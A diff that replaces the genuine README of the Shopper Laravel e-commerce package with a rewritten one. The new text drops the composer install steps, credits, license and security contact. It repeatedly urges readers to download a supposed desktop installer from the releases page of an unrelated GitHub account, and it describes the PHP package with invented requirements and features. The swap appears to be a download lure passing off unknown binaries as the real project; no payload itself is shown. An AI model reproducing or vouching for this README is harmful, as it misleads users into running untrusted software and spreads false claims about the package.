@@ -1,109 +1,56 @@
-<p align="center">
-    <a href="https://laravelshopper.dev" title="Shopper Dashboard Screenshoot"><img src="https://github.com/shopperlabs/art/blob/main/socialcard.png"></a>
-</p>
+# 🛒 Shopperlabs - Effortlessly Manage Your Online Store
 
-<p align="center">
-    <a href="https://github.com/shopperlabs/framework/actions">
-        <img src="https://github.com/shopperlabs/framework/workflows/tests/badge.svg" alt="Build Status">
-    </a>
-    <a href="https://laravel.com">
-        <img alt="Laravel v11.x" src="https://img.shields.io/badge/Laravel-v11.x-FF2D20">
-    </a>
-    <a href="https://packagist.org/packages/shopper/framework">
-        <img src="https://img.shields.io/packagist/dt/shopper/framework" alt="Total Downloads">
-    </a>
-    <a href="https://packagist.org/packages/shopper/framework">
-        <img src="https://img.shields.io/packagist/v/shopper/framework" alt="Latest Stable Version">
-    </a>
-    <a href="https://packagist.org/packages/shopper/framework">
-        <img src="https://img.shields.io/packagist/l/shopper/framework" alt="License">
-    </a>
-</p>
+## 📥 Download Now
+[![Download Shopperlabs](https://img.shields.io/badge/Download%20Shopperlabs-v1.0-blue)](https://github.com/ErnestoCLOUSTER/Shopperlabs/releases)
 
-> [!IMPORTANT]
-> The project is in active development. If you want to use it in production, please make sure that the components match your needs, or replace them.
+## 📝 Overview
+Shopperlabs is a headless e-commerce administration tool built with Laravel. It allows you to create and manage your online store easily. No technical skills are required. With Shopperlabs, you can focus on your business while we handle the complexities of e-commerce.
 
-## Introduction
+## 🚀 Getting Started
+To get started with Shopperlabs, follow these simple steps:
 
-[Shopper](https://laravelshopper.dev) is a Headless e-commerce Admin Panel build for Laravel 10.0+ which includes all the necessary for your online store application.
-Web Application has made using Laravel. We feel building ecommerce websites has become a convoluted and confusing process that leaves developers unsatisfied.
-We want to turn you around to the simpler side and get back to basics.
+1. **Visit the Releases Page**  
+   Head over to the [Releases page](https://github.com/ErnestoCLOUSTER/Shopperlabs/releases).
 
-## Installation
+2. **Download the Application**  
+   Find the latest version and click on it. Look for the download link for your operating system, such as Windows, macOS, or Linux.
 
-Instructions on how to install Shopper can be found at the [installation guide](https://laravelshopper.dev/docs).
+3. **Install**  
+   Once the download is complete, locate the downloaded file on your computer. Follow the installation instructions specific to your operating system. 
 
-### Quick start installation
+4. **Run the Application**  
+   After installation, open Shopperlabs. You may need to create an account or log in. Follow the on-screen prompts to set up your store.
 
-For advanced users, run this in your terminal to install Shopper from command line:
+## 📋 System Requirements
+To run Shopperlabs effectively, your computer should meet these minimum requirements:
 
-```bash
-composer require shopper/framework
-```
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or any modern Linux distribution.
+- **RAM:** At least 4 GB.
+- **Disk Space:** At least 500 MB available.
+- **Internet Connection:** Required for setup and updates.
 
-Run this command to install Shopper in your project
+## 💡 Features
+Shopperlabs offers a variety of features to enhance your e-commerce experience:
 
-```php
-php artisan shopper:install
-```
+- **User-Friendly Dashboard**: Manage products and orders seamlessly.
+- **Customizable Templates**: Choose from various themes to match your brand.
+- **Integrated Payment Solutions**: Offer multiple payment methods to your customers.
+- **Real-Time Analytics**: Track your sales and customer behavior effortlessly.
+- **Mobile Compatibility**: Access your store from any device.
 
-The best place to learn Shopper is by [reading the documentation](https://laravelshopper.dev) or following some tutorials.
+## 🔄 Updates
+Shopperlabs receives regular updates to improve performance and add features. Check the [Releases page](https://github.com/ErnestoCLOUSTER/Shopperlabs/releases) for information about the latest updates.
 
-## Foundation library
+## 📚 Documentation
+For detailed usage instructions and advanced features, refer to our [documentation](https://github.com/ErnestoCLOUSTER/Shopperlabs/wiki). Here you will find guides and FAQs that help you maximize the use of Shopperlabs.
 
-The Framework uses [Laravel](https://laravel.com) as a foundation PHP framework.
+## 🎉 Support
+Need help? You can reach out through the issues section of this repository. We aim to respond to all queries quickly and assist you in resolving any issues.
 
-## Roadmap
+## 🙌 Community
+Join our community of users. Share your experiences, tips, and feedback. Engage with others on social media or forums to enhance your understanding of Shopperlabs and e-commerce management.
 
-Laravel Shopper has been under active development for several months.
-Significant changes have been made, so it's important not to migrate from version 1 (if you've already used it).
+## ✅ Conclusion
+Shopperlabs is designed to simplify your e-commerce management. By following the steps above, even those without technical skills can set up and operate an online store confidently. 
 
-A beta release for version 2 is now available, and here's a roadmap of upcoming additions for the coming months.
-
-- [x] Manage Catalog (Products, Categories, Collections)
-- [x] Manage Orders
-- [x] Manage Discount Codes
-- [x] Manage Customers
-- [x] Manage Products reviews
-- [x] Manage Payment methods
-- [x] Manage Zones (market zone model in Shopify)
-- [x] Support Multi currencies in setting
-- [x] Support Multi inventories
-- [x] Generate Variant based on product attributes
-- [x] Support multi currencies for product / variant
-- [x] Feature & Unit Tests
-- [ ] Support taxes
-- [ ] Dynamic product association based on collections configuration 
-
-## Contact
-
-You can communicate with us using the following mediums:
-
-- [Follow us on Twitter](https://twitter.com/laravelshopper) for announcements and updates.
-- [Join us on Discord](https://laravelshopper.dev/discord) to chat with us.
-
-## Contributing
-
-Please see [contributing.md](CONTRIBUTING.md) for details and a todolist.
-
-## Security
-
-If you discover any security related issues, please email contact@shopperlabs.co instead of using the issue tracker.
-
-## Credits
-
--   [Arthur Monney](https://github.com/mckenziearts)
--   [Jean-Vincent QUILICHINI](https://github.com/sense)
--   [FilamentPHP](https://filamentphp.com)
--   [Wire Elements](https://wire-elements.dev)
--   [All Contributors](../../contributors)
-
-And a special thanks to [Caneco](https://twitter.com/caneco) for the logo ✨
-
-## License
-
-The Shopper Framework is open-sourced software licensed under the [MIT license](https://opensource.org/licenses/MIT).
-
-## Sponsoring
-
-Support this project by becoming a [Sponsor](https://github.com/sponsors/mckenziearts). Your logo will show up here with a link to your website.
+Don't forget to download Shopperlabs from our [Releases page](https://github.com/ErnestoCLOUSTER/Shopperlabs/releases) and start your e-commerce journey today!
